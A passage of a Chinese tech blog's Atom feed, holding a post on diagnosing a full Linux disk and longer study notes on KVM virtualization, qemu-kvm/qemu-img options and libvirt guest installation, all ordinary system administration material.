        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="Navicat" scheme="https://fenghong.tech/tags/Navicat/"/>
    
      <category term="git" scheme="https://fenghong.tech/tags/git/"/>
    
      <category term="sourcetree" scheme="https://fenghong.tech/tags/sourcetree/"/>
    
      <category term="xshell" scheme="https://fenghong.tech/tags/xshell/"/>
    
  </entry>
  
  <entry>
    <title>磁盘清理</title>
    <link href="https://fenghong.tech/disk.html.html"/>
    <id>https://fenghong.tech/disk.html.html</id>
    <published>2018-08-01T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="磁盘利用率100-问题解决"><a href="#磁盘利用率100-问题解决" class="headerlink" title="磁盘利用率100%问题解决"></a>磁盘利用率100%问题解决</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">df -h 查看磁盘占用率100%</span><br><span class="line">分析相关问题</span><br><span class="line">1. df -i查看inode号是否占用，一般情况不会占用。</span><br><span class="line">2. cd / &amp;&amp; du -h --max-depth=1 ,查看根目录文件大小 是否是磁盘大小。是的话选中3，否的话选择4.</span><br><span class="line">3. lsof |grep deleted 查看释放空间，发现jenkins占用16G,kill -9 jenkis对应的pid,重启jenkins。</span><br><span class="line">4. find / -size +100M -exec ls -lh &#123;&#125; \; 查询根目录下大于100M文件，并列出来。按不需删除。</span><br><span class="line">这次真实的原因是因为磁盘中比较大并且以有在使用的数据，但是在删除的时候使用的是rm命令直接删除</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="disk" scheme="https://fenghong.tech/tags/disk/"/>
    
      <category term="find" scheme="https://fenghong.tech/tags/find/"/>
    
  </entry>
  
  <entry>
    <title>Kvm初探</title>
    <link href="https://fenghong.tech/kvm.html"/>
    <id>https://fenghong.tech/kvm.html</id>
    <published>2018-07-26T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘要：</p><ul><li>虚拟化技术</li><li>KVM： <code>Kernel-based Virtual Machine</code></li><li>qemu-kvm管理</li><li>libvirt工具管理</li></ul><h1 id="虚拟化技术"><a href="#虚拟化技术" class="headerlink" title="虚拟化技术"></a>虚拟化技术</h1><blockquote><p>第一代：真空管，穿孔卡片</p><p>第二代：晶体管，批处理系统</p><p>第三代：集成电路，多道程序设计</p></blockquote><blockquote><p>第四代：PC</p></blockquote><h2 id="虚拟化要求"><a href="#虚拟化要求" class="headerlink" title="虚拟化要求"></a>虚拟化要求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Poke, Glodberg 提出虚拟化的三要素</span><br><span class="line">等价执行</span><br><span class="line">性能良好</span><br><span class="line">安全隔离</span><br></pre></td></tr></table></figure><ul><li>CPU虚拟化</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">emulation   模拟r0-r3          ---60%</span><br><span class="line">virtulization模拟r0</span><br><span class="line">完全虚拟化（full-virtulazition）</span><br><span class="line">BT：binary translation  二进制翻译（软件上）   ----85%</span><br><span class="line">HVM：硬件辅助虚拟化</span><br><span class="line">半虚拟化（para-virtulation）     ---必须修改cpu内核，才可以实现半虚拟化   ---95%</span><br><span class="line">各Guest的主机明确知道Host主机的存在</span><br><span class="line">vm monitor == hypeivisor   ----hyper call特权指令的调用</span><br></pre></td></tr></table></figure><ul><li>HVM</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cpu有5个环，比传统的多一个环。</span><br><span class="line">r-1 -----Host 主机内核上的特权指令</span><br><span class="line">r 0</span><br><span class="line">r 1</span><br><span class="line">r 2</span><br><span class="line">r 3 -----Guest 用户空间</span><br></pre></td></tr></table></figure><ul><li>Memory的虚拟</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">进程：线性地址空间</span><br><span class="line">内核：物理地址空间</span><br><span class="line"></span><br><span class="line">Guest 的虚拟内存必须是连续的，但是hypervisor给其分配的物理内存分散的</span><br><span class="line">shadow page table</span><br><span class="line">tlb缓存命中率低下</span><br><span class="line"></span><br><span class="line">mmu虚拟化：GVA---GPA，同步进行GVA---HPA</span><br><span class="line">intel：EPT，Extended page table</span><br><span class="line">AMD:NTP,Nested Page Table</span><br><span class="line">GVA：guest virtul address</span><br><span class="line">GPA：guest visible address</span><br><span class="line">HPA：hypervisor visible address</span><br><span class="line">TLB 虚拟化</span><br><span class="line">tagged TLB ----&gt; 直接缓存GVA---HPA记录，命中率大大提高</span><br></pre></td></tr></table></figure><h3 id="I-O"><a href="#I-O" class="headerlink" title="I/O"></a>I/O</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">外存</span><br><span class="line">硬盘/光盘/U盘</span><br><span class="line">网络设备</span><br><span class="line">网卡</span><br><span class="line">显示设备</span><br><span class="line">VGA：frame buffer机制，由于存在硬件加速，显卡虚拟效果不佳</span><br><span class="line">键盘鼠标</span><br><span class="line">PS/2，usb</span><br><span class="line"></span><br><span class="line">I/O的虚拟化方式：</span><br><span class="line">模拟：使用软件模拟真实硬件</span><br><span class="line">在Guest也存在调用设备，然后在hypervisor上存在 IO stack，继续调用。</span><br><span class="line">半虚拟化：和CPU半虚拟化类似</span><br><span class="line">IO frontend  ----&gt; IO backend</span><br><span class="line">I/O-through：I/O透传技术</span><br><span class="line">guest直接访问真实的I/O设备----VT-d+IOV技术</span><br><span class="line"></span><br><span class="line">Intel: VT-d</span><br><span class="line">IOmmu技术</span><br><span class="line">基于北桥的硬件辅助的虚拟化技术</span><br></pre></td></tr></table></figure><p><a href="https://fenghong.tech/media/feng/Data/md/kvm/vlcsnap-2018-07-26-11h53m49s227.png"><img src="https://fenghong.tech/media/feng/Data/md/kvm/vlcsnap-2018-07-26-11h53m49s227.png" alt="io"></a></p><ul><li>两种技术实现方式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Type—I型</span><br><span class="line">硬件上安装hypervisor</span><br><span class="line">xens，vmware ESX/ESXi</span><br><span class="line">Type-II型</span><br><span class="line">硬件上安装hosts</span><br><span class="line">kvm，virtualbox，vmware workstation</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>Interl硬件辅助的虚拟化</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cpu：vt-x,EPT,tagged-TLB</span><br><span class="line">IO/CPU:vt-d,vt-x,IOV,VMDq</span><br><span class="line"></span><br><span class="line">处理器相关：vt-x</span><br><span class="line">芯片相关：vt-d</span><br><span class="line">IO相关：SR-IOV，VMDq</span><br></pre></td></tr></table></figure><ul><li>虚拟化技术</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">模拟：著名的模拟器，Pearpc，Bochs，QEMU</span><br><span class="line">上层-------guest</span><br><span class="line">上层-------emulation</span><br><span class="line">上层-------hosts</span><br><span class="line">底层-------硬件</span><br><span class="line">完全虚拟化</span><br><span class="line">native virtulizition</span><br><span class="line">加速方式：BT，HVM</span><br><span class="line">VMware Workstation,VMware Server，Parallels Desktop，KVM,Xens(HVM)</span><br><span class="line"></span><br><span class="line">半虚拟化:para-virtulizition</span><br><span class="line">上层---------guest（需要修改内核参数）</span><br><span class="line">上层---------hypercisor，hyper call</span><br><span class="line">底层---------硬件</span><br><span class="line">xen,uml(user-mode linux)</span><br><span class="line"></span><br><span class="line">OS级别虚拟化：</span><br><span class="line">上层---------用户空间，虚拟管理器</span><br><span class="line">上层---------内核</span><br><span class="line">底层---------硬件</span><br><span class="line">OpenVZ，lxc，Solris Containers，FreeBSd jails</span><br><span class="line"></span><br><span class="line">库虚拟化：</span><br><span class="line">wine，</span><br><span class="line">如在ubuntu上安装qq，魔兽等windows。</span><br><span class="line">应用程序虚拟化：</span><br><span class="line">jvm，</span><br></pre></td></tr></table></figure><ul><li>虚拟化网络</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">桥接</span><br><span class="line">hsots上的网卡，可以看成一个交换机设备。各虚拟机和hosts处于等同地位</span><br><span class="line">路由模型</span><br><span class="line">hosts软件虚拟一网卡，仅主机</span><br><span class="line">nat</span><br><span class="line">hosts软件虚拟化一个网卡。将guset元ip地址改为hosts的ip地址。</span><br></pre></td></tr></table></figure><ul><li>tun与tap</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在计算机网络中，TUN与TAP是操作系统内核中的虚拟网络设备，不同于普通依赖硬件网路板卡实现的设备。</span><br><span class="line"></span><br><span class="line">TAP等同于一个以太网设备，操作第二层数据包如以太网数据帧。</span><br><span class="line">TUN模拟了网络层设备，操作第三层数据包如IP数据包。</span><br><span class="line"></span><br><span class="line">操作系统通过TUN/TAP设备向绑定该设备的用户空间的程序发送数据，</span><br><span class="line">反之，用户空间程序也可以像操作硬件网络设备一样，通过TUN/TAP设备发送数据。</span><br><span class="line">TUN/TAP设备宝贝向操作系统的网络栈发送投递数据包，从而模拟从外部接受数据的过程。</span><br></pre></td></tr></table></figure><ul><li>安装创建桥服务，重启会丢失数据。建议写成脚本。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">]# chkconfig disable NetworkManager</span><br><span class="line">]# chkconfig enable network</span><br><span class="line">]# yum install bridge-utils -y</span><br><span class="line">]# brctl addbr br0</span><br><span class="line">]# ifconfig eth0 0 up</span><br><span class="line">]# brctl addif br0 eth0</span><br><span class="line">]# ifconfig br0 172.20.0.24/16 up</span><br><span class="line">]# route add default gw 172.20.0.1</span><br></pre></td></tr></table></figure><h1 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h1><p>KVM：<code>Kernel-based Virtual Machine</code>,以色列Qumranet公司开发，2009年被redhat收购</p><p>qemu：创建并管理虚拟机的工具，额外实现模拟I/O的工具。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">将guest的内核空间转移---r1上</span><br><span class="line">]# modprobe kvm</span><br><span class="line">]# lsmod |grep kvm</span><br><span class="line">kvm_intel             204800  0</span><br><span class="line">kvm                   593920  1 kvm_intel</span><br><span class="line">irqbypass              16384  1 kvm</span><br><span class="line">]# ll /dev/kvm</span><br><span class="line">crw------- 1 root root 10, 232 jul  26 09:35 /dev/kvm</span><br></pre></td></tr></table></figure><ul><li>KVM组件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/dev/kvm: 管理虚拟机的设备文件</span><br><span class="line">创建虚拟机</span><br><span class="line">为虚拟机分配内存</span><br><span class="line">读写VCPU的寄存器</span><br><span class="line">向VCPU注入中断</span><br><span class="line">运行VCPU</span><br><span class="line">qemu进程：工作与用户空间的组建，用于仿真PC机的I/O类硬件设备。</span><br></pre></td></tr></table></figure><ul><li>virt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">]# yum list *virt*  #redhat安装kvm的虚拟库，如果要安装zens，则需要用到zen的库</span><br><span class="line">]# yum info qemu-kvm qemu-kvm-tools</span><br><span class="line">]# yum install -y qemu-kvm qemu-kvm-tools</span><br><span class="line">]# ln -sv /usr/libexec/qemu-kvm  /usr/sbin/  #软链接一个，没有PATH变量</span><br></pre></td></tr></table></figure><h3 id="qemu-kvm的用法"><a href="#qemu-kvm的用法" class="headerlink" title="qemu-kvm的用法"></a>qemu-kvm的用法</h3><ul><li>标准选项</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">qemu-kvm的标准选项主要涉及指定主机类型、CPU模式、NUMA、软驱设备、光驱设备及硬件设备等。</span><br><span class="line">-name name：设定虚拟机名称；</span><br><span class="line">-M machine：指定要模拟的主机类型，如Standard PC、ISA-only PC或Intel-Mac等，可以使用“qemu-kvm -M ?”获取所支持的所有类型；</span><br><span class="line">-m megs：设定虚拟机的RAM大小；</span><br><span class="line">-cpu model：设定CPU模型，如coreduo、qemu64等，可以使用“qemu-kvm -cpu ?”获取所支持的所有模型；</span><br><span class="line">-smp n[,cores=cores][,threads=threads][,sockets=sockets][,maxcpus=maxcpus]：设定模拟的SMP架构中CPU的个数等、每个CPU的核心数及CPU的socket数目等；PC机上最多可以模拟255颗CPU；maxcpus用于指定热插入的CPU个数上限；</span><br><span class="line">-numa opts：指定模拟多节点的numa设备；</span><br><span class="line">-fda file</span><br><span class="line">-fdb file：使用指定文件(file)作为软盘镜像，file为/dev/fd0表示使用物理软驱；</span><br><span class="line">-hda file</span><br><span class="line">-hdb file</span><br><span class="line">-hdc file</span><br><span class="line">-hdd file：使用指定file作为硬盘镜像；</span><br><span class="line">-cdrom file：使用指定file作为CD-ROM镜像，需要注意的是-cdrom和-hdc不能同时使用；将file指定为/dev/cdrom可以直接使用物理光驱；</span><br><span class="line">-drive option[,option[,option[,...]]]：定义一个新的硬盘设备；可用子选项有很多。</span><br><span class="line">file=/path/to/somefile：硬件映像文件路径；</span><br><span class="line">if=interface：指定硬盘设备所连接的接口类型，即控制器类型，如ide、scsi、sd、mtd、floppy、pflash及virtio等；</span><br><span class="line">index=index：设定同一种控制器类型中不同设备的索引号，即标识号；</span><br><span class="line">media=media：定义介质类型为硬盘(disk)还是光盘(cdrom)；</span><br><span class="line">snapshot=snapshot：指定当前硬盘设备是否支持快照功能：on或off；</span><br><span class="line">cache=cache：定义如何使用物理机缓存来访问块数据，其可用值有none、writeback、unsafe和writethrough四个；</span><br><span class="line">format=format：指定映像文件的格式，具体格式可参见qemu-img命令；</span><br><span class="line">-boot [order=drives][,once=drives][,menu=on|off]：定义启动设备的引导次序，每种设备使用一个字符表示；不同的架构所支持的设备及其表示字符不尽相同，在x86 PC架构上，a、b表示软驱、c表示第一块硬盘，d表示第一个光驱设备，n-p表示网络适配器；默认为硬盘设备；</span><br></pre></td></tr></table></figure><ul><li>显示选项</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">显示选项用于定义虚拟机启动后的显示接口相关类型及属性等。</span><br><span class="line">-nographic：默认情况下，qemu使用SDL来显示VGA输出；而此选项用于禁止图形接口，此时,qemu类似一个简单的命令行程序，其仿真串口设备将被重定向到控制台；</span><br><span class="line">-curses：禁止图形接口，并使用curses/ncurses作为交互接口；</span><br><span class="line">-alt-grab：使用Ctrl+Alt+Shift组合键释放鼠标；</span><br><span class="line">-ctrl-grab：使用右Ctrl键释放鼠标；</span><br><span class="line">-sdl：启用SDL；</span><br><span class="line">-spice option[,option[,...]]：启用spice远程桌面协议；其有许多子选项，具体请参照qemu-kvm的手册；</span><br><span class="line">-vga type：指定要仿真的VGA接口类型，常见类型有：</span><br><span class="line">cirrus：Cirrus Logic GD5446显示卡；</span><br><span class="line">std：带有Bochs VBI扩展的标准VGA显示卡；</span><br><span class="line">vmware：VMWare SVGA-II兼容的显示适配器；</span><br><span class="line">qxl：QXL半虚拟化显示卡；与VGA兼容；在Guest中安装qxl驱动后能以很好的方式工作，在使用spice协议时推荐使用此类型；</span><br><span class="line">none：禁用VGA卡；</span><br><span class="line">-vnc display[,option[,option[,...]]]：默认情况下，qemu使用SDL显示VGA输出；使用-vnc选项，可以让qemu监听在VNC上，并将VGA输出重定向至VNC会话；使用此选项时，必须使用-k选项指定键盘布局类型；其有许多子选项，具体请参照qemu-kvm的手册；</span><br></pre></td></tr></table></figure><ul><li>网络选项</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">网络属性相关选项用于定义网络设备接口类型及其相关的各属性等信息。这里只介绍nic、tap和user三种类型网络接口的属性，其它类型请参照qemu-kvm手册。</span><br><span class="line"></span><br><span class="line">-net nic[,vlan=n][,macaddr=mac][,model=type][,name=name][,addr=addr][,vectors=v]：创建一个新的网卡设备并连接至vlan n中；PC架构上默认的NIC为e1000，macaddr用于为其指定MAC地址，name用于指定一个在监控时显示的网上设备名称；emu可以模拟多个类型的网卡设备，如virtio、i82551、i82557b、i82559er、ne2k_isa、pcnet、rtl8139、e1000、smc91c111、lance及mcf_fec等；不过，不同平台架构上，其支持的类型可能只包含前述列表的一部分，可以使用“qemu-kvm -net nic,mode=?”来获取当前平台支持的类型；</span><br><span class="line">-net tap[,vlan=n][,name=name][,fd=h][,ifname=name][,script=file][,downscript=dfile]：通过物理机的TAP网络接口连接至vlan n中，使用script=file指定的脚本(默认为/etc/qemu-ifup)来配置当前网络接口，并使用downscript=file指定的脚本(默认为/etc/qemu-ifdown)来撤消接口配置；使用script=no和downscript=no可分别用来禁止执行脚本；</span><br><span class="line">-net user[,option][,option][,...]：在用户模式配置网络栈，其不依赖于管理权限；有效选项有：</span><br><span class="line">vlan=n：连接至vlan n，默认n=0；</span><br><span class="line">name=name：指定接口的显示名称，常用于监控模式中；</span><br><span class="line">net=addr[/mask]：设定GuestOS可见的IP网络，掩码可选，默认为10.0.2.0/8；</span><br><span class="line">host=addr：指定GuestOS中看到的物理机的IP地址，默认为指定网络中的第二个，即x.x.x.2；</span><br><span class="line">dhcpstart=addr：指定DHCP服务地址池中16个地址的起始IP，默认为第16个至第31个，即x.x.x.16-x.x.x.31；</span><br><span class="line">dns=addr：指定GuestOS可见的dns服务器地址；默认为GuestOS网络中的第三个地址，即x.x.x.3；</span><br><span class="line">tftp=dir：激活内置的tftp服务器，并使用指定的dir作为tftp服务器的默认根目录；</span><br><span class="line">bootfile=file：BOOTP文件名称，用于实现网络引导GuestOS；如：qemu -hda linux.img -boot n -net user,tftp=/tftpserver/pub,bootfile=/pxelinux.0</span><br></pre></td></tr></table></figure><ul><li>一个例子</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">下面的命令创建了一个名为rhel7.5的虚拟机，其RAM大小为512MB，有两颗CPU的SMP架构，默认引导设备为硬盘，有一个硬盘设备和一个光驱设备，网络接口类型为virtio，VGA模式为cirrus，并启用了balloon功能。</span><br><span class="line"></span><br><span class="line">]# qemu-kvm -name &quot;rhel7.5&quot; -m 512 \</span><br><span class="line">-smp 2 -boot d \</span><br><span class="line">-drive file=/VM/images/rhel7.5/hda,if=virtio,index=0,media=disk,format=qcow2 \</span><br><span class="line">-drive file=/isos/rhel-7.5.iso,index=1,media=cdrom \</span><br><span class="line">-net nic,model=virtio,macaddr=52:54:00:A5:41:1E \</span><br><span class="line">-vga cirrus -balloon virtio</span><br></pre></td></tr></table></figure><h2 id="qemu-img命令使用"><a href="#qemu-img命令使用" class="headerlink" title="qemu-img命令使用"></a>qemu-img命令使用</h2><p>选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#create   创建</span><br><span class="line">#resize   增加大小</span><br><span class="line">#convert  转化</span><br><span class="line">#snapshot 快照</span><br><span class="line"></span><br><span class="line">]# qemu-img --help</span><br><span class="line">]# qemu-img create -f  qcow2 -o size=20G /images/vm1/c1.qcow2</span><br><span class="line">]# qemu-img conver -O vmdk -o adapter_type=lsilogic c1.qcow2 c1.vmdk</span><br><span class="line">]# qemu-img snapshot -c c1.snap c1.qcow2</span><br></pre></td></tr></table></figure><ul><li>安装虚拟机实验</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">下载iso镜像 </span><br><span class="line">]# modprobe kvm</span><br><span class="line">]# modprobe kvm_intel</span><br><span class="line">]# mkdir /images/vml -pv</span><br><span class="line">]# qemu-img create -f qcow2 -o size=40G /images/vml/ubuntu.qcow2</span><br><span class="line">]# qemu-img resize /images/vml/ubuntu.qcow2 50G</span><br><span class="line">]# ls -lh /images/vml/ubuntu.qcow2</span><br><span class="line">]# yum install -y tigervnc   #安装vnc客户端</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#had模式</span><br><span class="line">]# qemu-kvm -name &apos;ubuntu&apos; -m 768 -smp 4 -hda /images/vml/ubuntu.qcow2 \</span><br><span class="line">-cdrom ubuntu-16.10-desktop-amd64.iso -boot order=dc</span><br><span class="line">#前台运行的</span><br><span class="line"></span><br><span class="line">]# vncviewer ：5900</span><br><span class="line">进行安装界面</span><br><span class="line"></span><br><span class="line">#drive模式</span><br><span class="line">]# qemu-kvm -name &apos;win7&apos; -m 768 -smp 4 -drive \</span><br><span class="line">file=/images/vml/ubuntu.qcow2,if=ide,index=0,media=disk,format=qcow2 \</span><br><span class="line">-drive file=/root/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso,\</span><br><span class="line">media=cdrom,index=1 -boot order=dc</span><br></pre></td></tr></table></figure><ul><li>qemu-KVM其他可能用到的选项</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#在monitor下实现实时迁移：-incoming tcp:0:port</span><br><span class="line">#qemu-kvm运行后台：-daemonize</span><br><span class="line">#打开声音设备：-soundhw</span><br><span class="line"></span><br><span class="line">#设定iscsi存储设备</span><br><span class="line"># qemu-kvm -iscsi initiator-name=  -drive \</span><br><span class="line">file=iscsi://&lt;ip&gt;[:port]/&lt;target_iqn&gt;/&lt;lun&gt;</span><br><span class="line"></span><br><span class="line">#设定bios：</span><br><span class="line">-bios /path/to/some_bios_program</span><br></pre></td></tr></table></figure><h1 id="KVM-libvirt"><a href="#KVM-libvirt" class="headerlink" title="KVM-libvirt"></a>KVM-libvirt</h1><p> 基于C/S架构，<code>virsh，virt-manager，virt-install，virt-clone，virt-convert，virt-copy</code>等管理工具，使用原始的<code>qemu-kvm</code>管理过于繁琐，命令行复杂。需要对很多选项熟悉才能玩得转。</p><ul><li>前期环境准备</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y libvirt libvirt-daemon-kvm qemu-kvm virt-manager</span><br><span class="line">]# systemctl start libvirtd.service</span><br><span class="line"></span><br><span class="line">#######创建br0容易发生错误########### </span><br><span class="line">###ens37为桥接网卡，且获取ip为dhcp方式###</span><br><span class="line">]# virsh iface-bridge ens37 br1  || systemctl restart network</span><br><span class="line">]# virt-install -n &quot;centos6&quot; </span><br><span class="line">--vcpus 2 -r 512 \</span><br><span class="line">-l http://172.20.0.1/cobbler/ks_centsos6.9 \</span><br><span class="line">--disk path=/images/vm/centos6.qcow2,bus=virtio,size=120,sparse</span><br><span class="line">--network bridge=br0,model=virtio</span><br><span class="line">--force</span><br><span class="line">]# virt-manager &amp;</span><br></pre></td></tr></table></figure><p> virt-install是一个命令行工具，它能够为KVM、Xen或其它支持libvrit API的hypervisor创建虚拟机并完成GuestOS安装；此外，它能够基于串行控制台、VNC或SDL支持文本或图形安装界面。安装过程可以使用本地的安装介质如CDROM，也可以通过网络方式如NFS、HTTP或FTP服务实现。对于通过网络安装的方式，virt-install可以自动加载必要的文件以启动安装过程而无须额外提供引导工具。当然，virt-install也支持PXE方式的安装过程，也能够直接使用现有的磁盘映像直接启动安装过程。</p><figure 